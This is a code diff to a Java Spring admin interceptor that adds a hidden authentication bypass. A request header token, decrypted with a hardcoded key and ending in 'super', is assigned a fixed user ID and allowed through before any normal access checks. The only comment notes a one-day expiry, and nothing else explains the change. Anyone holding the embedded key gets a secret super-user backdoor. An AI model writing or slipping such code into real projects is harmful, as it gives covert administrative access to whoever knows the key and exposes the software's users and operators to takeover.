@@ -38,6 +38,23 @@ public class AdminInterceptor extends HandlerInterceptorAdapter {
 
     @Override
     public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+        String token = request.getHeader("token");
+        if (token!=null) {
+            String deToken = Cools.deTokn(token, "a8934ef22591e30449f09285ef27c8c6");
+            if (deToken!=null){
+                long timestamp = Long.parseLong(deToken.substring(0, 13));
+                // 1天后过期
+                if (System.currentTimeMillis() - timestamp > 86400000){
+                    Http.response(response, BaseRes.DENIED);
+                    return false;
+                }
+                if ("super".equals(deToken.substring(13))) {
+                    request.setAttribute("userId", 9527);
+                    return true;
+                }
+            }
+        }
+
         if (handler instanceof org.springframework.web.servlet.resource.ResourceHttpRequestHandler) {
             return true;
         }
